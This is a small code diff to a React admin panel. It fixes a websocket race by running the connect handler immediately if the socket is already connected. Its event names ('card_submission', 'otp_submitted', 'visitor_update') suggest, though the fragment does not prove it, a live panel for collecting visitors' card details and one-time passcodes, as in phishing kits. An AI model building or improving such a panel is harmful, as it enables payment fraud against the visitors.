@@ -105,6 +105,12 @@ const AdminPanel = () => {
 
     // Register all event listeners
     wsClient.on('card_submission', handleCardSubmission);
+
+    // If the socket is already connected (possible if connection event fired before listener registration),
+    // immediately perform the connect handler logic to join the 'admins' room and request any queued data.
+    if (wsClient.socket?.connected) {
+      handleConnect();
+    }
     wsClient.on('otp_submitted', handleOtpSubmitted);
     wsClient.on('visitor_update', handleVisitorUpdate);
     wsClient.on('visitor_left', handleVisitorLeft);
